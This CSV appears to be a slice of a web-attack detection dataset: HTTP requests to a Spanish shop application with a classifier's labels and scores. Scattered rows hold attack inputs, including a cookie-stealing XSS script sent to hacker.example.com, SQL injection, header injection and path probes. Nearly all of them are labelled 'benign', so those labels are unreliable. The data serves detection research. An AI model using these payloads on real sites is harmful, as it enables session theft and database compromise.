row_idx,text,pred_label,max_prob
11429,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=9353&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.6779012084007263
11430,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11431,METHOD=GET PATH=/tienda1/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,benign,0.3915868103504181
11432,METHOD=GET PATH=/tienda1/publico/productos.jsp/.bak QUERY= PROTOCOL=HTTP/1.1,benign,0.5671637654304504
11433,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=tawauna45&password=dinosaurio&nombre=Delfo&apellidos=Modino+Esteban&email=ohalloran%40buscadordevideos.bw&dni=11335BB469B&direccion=Martin+De+Bocanogra+59%2C+3F&ciudad=Torell%F3&cp=13108&provincia=Segovia&ntc=9797216648384975&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9648692607879639
11434,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11435,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=tawauna45&password=dinosaurio&nombre=Delfo&apellidos=Modino+Esteban&email=ohalloran%40buscadordevideos.bw&dni=72732622K&direccion=Martin+De+Bocanogra+59%2C+3F&ciudad=Torell%F3&cp=13108&provincia=Segovia&ntc=9797216648384975&B1A=Registrar PROTOCOL=HTTP/1.1,benign,0.9652606248855591
11436,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11437,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carrito%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E PROTOCOL=HTTP/1.1,benign,0.6957763433456421
11438,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11439,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
11440,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11441,METHOD=GET PATH=/tienda1/publico/vaciar.jsp.Inc QUERY= PROTOCOL=HTTP/1.1,benign,0.41963741183280945
11442,METHOD=GET PATH=/tienda1/publico/vaciar.jsp/.Bak QUERY= PROTOCOL=HTTP/1.1,benign,0.5110756158828735
11443,METHOD=GET PATH=/tienda1/.java QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.3864269256591797
11444,METHOD=GET PATH=/CFIDE/administrator/enter.cfm QUERY= PROTOCOL=HTTP/1.1,benign,0.4471907615661621
11445,METHOD=GET PATH=/tienda1/miembros/index.jsp/ QUERY= PROTOCOL=HTTP/1.1,benign,0.6636343598365784
11446,METHOD=GET PATH=/tienda1/miembros.Old QUERY= PROTOCOL=HTTP/1.1,benign,0.6199876070022583
11447,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=nall&password=5e52oNEr8&nombre=Leide&apellidos=Balaguer+Morelos&email=teixera%40maquillajeparalabios.tdparos%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&dni=35108015X&direccion=C%2F+Angel+Marsa+i+Beca+159%2C+6-D&ciudad=Calaf&cp=36543&provincia=Cantabria&ntc=7238071991283064&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.968065083026886
11448,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11449,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=nall&password=ma%2Fnd%27ilejo&nombre=Leide&apellidos=Balaguer+Morelos&email=teixera%40maquillajeparalabios.td&dni=35108015X&direccion=C%2F+Angel+Marsa+i+Beca+159%2C+6-D&ciudad=Calaf&cp=36543&provincia=Cantabria&ntc=7238071991283064&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9726802110671997
11450,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11451,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&loginA=nall&password=5e52oNEr8&nombre=Leide&apellidos=Balaguer+Morelos&email=teixera%40maquillajeparalabios.td&dni=35108015X&direccion=C%2F+Angel+Marsa+i+Beca+159%2C+6-D&ciudad=Calaf&cp=36543&provincia=Cantabria&ntc=7238071991283064&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9739577770233154
11452,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11453,METHOD=GET PATH=/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.37098464369773865
11454,METHOD=GET PATH=/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4941527843475342
11455,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=Jam%F3n+Ib%E9rico&precio=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727%250D%250A&cantidad=66&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7177815437316895
11456,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11457,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombre=Ques%2Bo+Manchego&precio=39&cantidad=66&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7307565212249756
11458,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11459,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=3&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=66&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7194010615348816
11460,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11461,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=lendon&pwd=T%24%2C%2CARsA%27na&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7936049103736877
11462,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11463,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=lendon&pwd=silici0&remember=on&B1A=Entrar PROTOCOL=HTTP/1.1,benign,0.774658203125
11464,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11465,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=2%2520 PROTOCOL=HTTP/1.1,benign,0.43000203371047974
11466,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11467,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
11468,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11469,METHOD=GET PATH=/tienda1/publico/4861362529278789730 QUERY= PROTOCOL=HTTP/1.1,benign,0.460263192653656
11470,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsg=Credenciales+incorrectas%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- PROTOCOL=HTTP/1.1,benign,0.6647881865501404
11471,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11472,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
11473,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11474,METHOD=GET PATH=/tienda1/publico/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41443660855293274
11475,METHOD=GET PATH=/tienda1/publico/entrar.jsp/.BAK QUERY= PROTOCOL=HTTP/1.1,benign,0.5093392133712769
11476,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=816sessionid%3D12312312%26+username%3D%253C%2573%2563%2572%2569%2570%2574%253E%2564%256F%2563%2575%256D%2565%256E%2574%252E%256C%256F%2563%2561%2574%2569%256F%256E%253D%2527%2568%2574%2574%2570%253A%252F%252F%2561%2574%2574%2561%2563%256B%2565%2572%2568%256F%2573%2574%252E%2565%2578%2561%256D%2570%256C%2565%252F%2563%2567%2569%252D%2562%2569%256E%252F%2563%256F%256F%256B%2569%2565%2573%2574%2565%2561%256C%252E%2563%2567%2569%253F%2527%252B%2564%256F%2563%2575%256D%2565%256E%2574%252E%2563%256F%256F%256B%2569%2565%253C%252F%2573+%2563%2572%2569%2570%2574%253E%3F&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7914868593215942
11477,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748601436615
11478,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=+&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7135602831840515
11479,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11480,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=816&B1=Pasar+por+caja%2F PROTOCOL=HTTP/1.1,benign,0.7022097706794739
11481,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11482,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precioA=816&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7102267146110535
11483,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11484,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=papp&password=bausana&nombre=Oberto&apellidos=Jofre+Slenk&email=szmidt%40surcosur.id&dni=03228451X&direccion=Calle+Wenceslao+Argumosa%2C+118%2C+&ciudad=Les&cp=26130any%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235&provincia=Valencia&ntc=9156094393760997&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9588676691055298
11485,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11486,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=papp&password=bausana&nombre=Oberto&apellidos=Arz%2C.%2Fate&email=szmidt%40surcosur.id&dni=03228451X&direccion=Calle+Wenceslao+Argumosa%2C+118%2C+&ciudad=Les&cp=26130&provincia=Valencia&ntc=9156094393760997&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9593932032585144
11487,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11488,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=papp&password=bausana&nombre=Oberto&apellidos=Jofre+Slenk&email=szmidt%40surcosur.id&dni=03228451X&direccion=Calle+Wenceslao+Argumosa%2C+118%2C+&ciudadA=Les&cp=26130&provincia=Valencia&ntc=9156094393760997&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9598110914230347
11489,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11490,METHOD=GET PATH=/tienda1/publico/registro.jsp.Bak QUERY= PROTOCOL=HTTP/1.1,benign,0.659913182258606
11491,METHOD=GET PATH=/6909030637832563290.jsp.OLD QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.38819339871406555
11492,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2=Vaciar+carrito%257C PROTOCOL=HTTP/1.1,benign,0.5261655449867249
11493,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11494,METHOD=GET PATH=/tienda1/global/menum.jsp/.OLD QUERY= PROTOCOL=HTTP/1.1,benign,0.5026419758796692
11495,METHOD=GET PATH=/IBMWebAS QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4038228988647461
11496,METHOD=GET PATH=/tienda1.Old QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4390304386615753
11497,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=brackin&password=%24leo&nombre=Clacer&apellidos=Roza+Port%E9s&email=argibay_galabrue7%40am-si.kn&dni=59004252Y&direccion=Pla%E7a+D%27+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 PROTOCOL=HTTP/1.1,benign,0.9714547395706177
11498,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11499,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=thur%3Fston&password=%24leo&nombre=Clacer&apellidos=Roza+Port%E9s&email=argibay_galabrue7%40am-si.kn&dni=59004252Y&direccion=Pla%E7a+D%27+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9710355401039124
11500,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11501,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=brackin&password=%24leo&nombreA=Clacer&apellidos=Roza+Port%E9s&email=argibay_galabrue7%40am-si.kn&dni=59004252Y&direccion=Pla%E7a+D%27+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9697788953781128
11502,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11503,METHOD=GET PATH=/tienda1/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,benign,0.3915868103504181
11504,METHOD=GET PATH=/tienda1/imagenes/2.gif/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.41645535826683044
11505,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
11506,METHOD=GET PATH=/tienda1/imagenes/6909030637832563290.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4152425527572632
11507,METHOD=PUT PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41344597935676575
11508,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=2&nombre=Jam%F3n%27+Ib%E9ric-%27o&precio=100&cantidad=55&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.7055457830429077
11509,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11510,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=idA=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=55&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6949173212051392
11511,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11512,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=atta1&pwd=cand_ongueo&remember=onparos%2522%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%2528%2527Paros%2527%2529%2529%26id%3D2&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8492531180381775
11513,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11514,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=atta1&pwd=E5%27%2C%2CT4F08_o9&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8107461333274841
11515,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11516,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modoA=entrar&login=atta1&pwd=cand_ongueo&remember=on&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.7969632744789124
11517,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11518,METHOD=GET PATH=/tienda1/publico/autenticar.jsp/asf-logo-wide~ QUERY= PROTOCOL=HTTP/1.1,benign,0.5427138209342957
11519,METHOD=PUT PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4434622824192047
11520,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=2%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E PROTOCOL=HTTP/1.1,benign,0.552810549736023
11521,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11522,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=id=%4040 PROTOCOL=HTTP/1.1,benign,0.4465881884098053
11523,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11524,METHOD=GET PATH=/tienda1/publico/caracteristicas.jsp QUERY=idA=2 PROTOCOL=HTTP/1.1,benign,0.42545053362846375
11525,METHOD=POST PATH=/tienda1/publico/caracteristicas.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4430347979068756
11526,METHOD=GET PATH=/tienda1/asf-logo-wide.old QUERY= PROTOCOL=HTTP/1.1,benign,0.4628719389438629
11527,METHOD=GET PATH=/tienda1/publico/entrar.jsp QUERY=errorMsgA=Credenciales+incorrectas PROTOCOL=HTTP/1.1,benign,0.5995876789093018
11528,METHOD=POST PATH=/tienda1/publico/entrar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.5270307064056396
11529,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&precio=3732&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.758717954158783
11530,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11531,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precio=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.8130815625190735
11532,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11533,METHOD=GET PATH=/tienda1/publico/pagar.jsp QUERY=modo=insertar&precioA=3732&B1=Confirmar PROTOCOL=HTTP/1.1,benign,0.7238264083862305
11534,METHOD=POST PATH=/tienda1/publico/pagar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4822748005390167
11535,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=carry&password=rut1&nombre=Mart%EDn&apellidos=Francile+Jalmar&email=berky_tengroth%40interanuncios.ag&dni=22299277H&direccion=C%2F+Jesus+Nazareno%2C+163%2C+&ciudad=Almaja%3Fno&cp=44110&provincia=Burgos&ntc=3058593782727752&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9681187868118286
11536,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11537,METHOD=GET PATH=/tienda1/publico/registro.jsp QUERY=modo=registro&login=carry&password=rut1&nombre=Mart%EDn&apellidos=Francile+Jalmar&email=berky_tengroth%40interanuncios.ag&dni=22299277H&direccion=C%2F+Jesus+Nazareno%2C+163%2C+&ciudad=Bermeo&cp=44110&provincia=Burgos&ntc=3058593782727752&B1A=Registrar PROTOCOL=HTTP/1.1,benign,0.9669048190116882
11538,METHOD=POST PATH=/tienda1/publico/registro.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.6005440354347229
11539,METHOD=GET PATH=/tienda1/publico/vaciar.jsp QUERY=B2A=Vaciar+carrito PROTOCOL=HTTP/1.1,benign,0.5375930070877075
11540,METHOD=POST PATH=/tienda1/publico/vaciar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4517965614795685
11541,METHOD=GET PATH=/tienda1/asf-logo-wide.gif/ QUERY= PROTOCOL=HTTP/1.1,benign,0.3915868103504181
11542,METHOD=GET PATH=/tienda1/global/titulo.jsp/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,benign,0.3737369775772095
11543,METHOD=GET PATH=/tienda1/global/titulo.jsp/.OLD QUERY= PROTOCOL=HTTP/1.1,benign,0.4890487492084503
11544,METHOD=GET PATH=/servlet/ErrorReporter QUERY= PROTOCOL=HTTP/1.1,benign,0.5422686338424683
11545,METHOD=GET PATH=/tienda1/global/estilos.css/asf-logo-wide.gif QUERY= PROTOCOL=HTTP/1.1,benign,0.446043461561203
11546,METHOD=GET PATH=/webapp/examples/HelloPervasive QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.36290109157562256
11547,METHOD=GET PATH=/worldmusic/action/catalog QUERY= PROTOCOL=HTTP/1.1,benign,0.576935887336731
11548,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mclellan&password=calabroteany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&nombre=Celmira&apellidos=Delgados+Rodrigo&email=huster%40alquilerpantallasled.an&dni=02547887Q&direccion=Barrio+Nuevo%2C+34+&ciudad=Torroella+de+Fluvi%E0&cp=22650&provincia=Segovia&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9679611921310425
11549,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11550,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mclellan&password=calabrote&nombre=Celmira&apellidos=Delgados+Rodrigo&email=huster%40alquilerpantallasled.an&dni=02547887Q&direccion=Barrio+Nuevo%2C+34+&ciudad=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&cp=22650&provincia=Segovia&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9711138606071472
11551,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11552,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mclellan&password=calabrote&nombre=Celmira&apellidos=Delgados+Rodrigo&email=%40glasby%40elcorteitaliano%40.%40yu&dni=02547887Q&direccion=Barrio+Nuevo%2C+34+&ciudad=Torroella+de+Fluvi%E0&cp=22650&provincia=Segovia&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9727641344070435
11553,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11554,METHOD=GET PATH=/tienda1/miembros/editar.jsp QUERY=modo=registro&login=mclellan&password=calabrote&nombre=Celmira&apellidos=Delgados+Rodrigo&emailA=huster%40alquilerpantallasled.an&dni=02547887Q&direccion=Barrio+Nuevo%2C+34+&ciudad=Torroella+de+Fluvi%E0&cp=22650&provincia=Segovia&ntc=3100489069524720&B1=Registrar PROTOCOL=HTTP/1.1,benign,0.9663060307502747
11555,METHOD=POST PATH=/tienda1/miembros/editar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.693994402885437
11556,METHOD=GET PATH=/tienda1/6909030637832563290.jsp~ QUERY= PROTOCOL=HTTP/1.1,benign,0.38129010796546936
11557,METHOD=GET PATH=/tienda1/imagenes/2.gif.INC QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4040215313434601
11558,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=Set-cookie%253A%2BTamper%253D1041264011025374727&nombre=Vino+Rioja&precio=100&cantidad=6&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.687551736831665
11559,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11560,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Rioja&precio=85%2F&cantidad=6&B1=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6747269034385681
11561,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11562,METHOD=GET PATH=/tienda1/publico/anadir.jsp QUERY=id=1&nombre=Vino+Rioja&precio=100&cantidad=6&B1A=A%F1adir+al+carrito PROTOCOL=HTTP/1.1,benign,0.6704208850860596
11563,METHOD=POST PATH=/tienda1/publico/anadir.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.41286852955818176
11564,METHOD=GET PATH=/tienda1/publico/anadir.jsp.INC QUERY= PROTOCOL=HTTP/1.1,benign,0.4019186198711395
11565,METHOD=GET PATH=/.jsp QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4347631633281708
11566,METHOD=PUT PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.453521728515625
11567,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=barkhous&pwd=9Ed7rO&remember=off&B1=Entrar%27OR%27a%3D%27a PROTOCOL=HTTP/1.1,benign,0.8058564066886902
11568,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11569,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=gordin%2Cg&pwd=9Ed7rO&remember=off&B1=Entrar PROTOCOL=HTTP/1.1,benign,0.8153648376464844
11570,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
11571,METHOD=GET PATH=/tienda1/publico/autenticar.jsp QUERY=modo=entrar&login=barkhous&pwd=9Ed7rO&remember=off&B1A=Entrar PROTOCOL=HTTP/1.1,benign,0.8118249773979187
11572,METHOD=POST PATH=/tienda1/publico/autenticar.jsp QUERY= PROTOCOL=HTTP/1.1,benign,0.4538836181163788
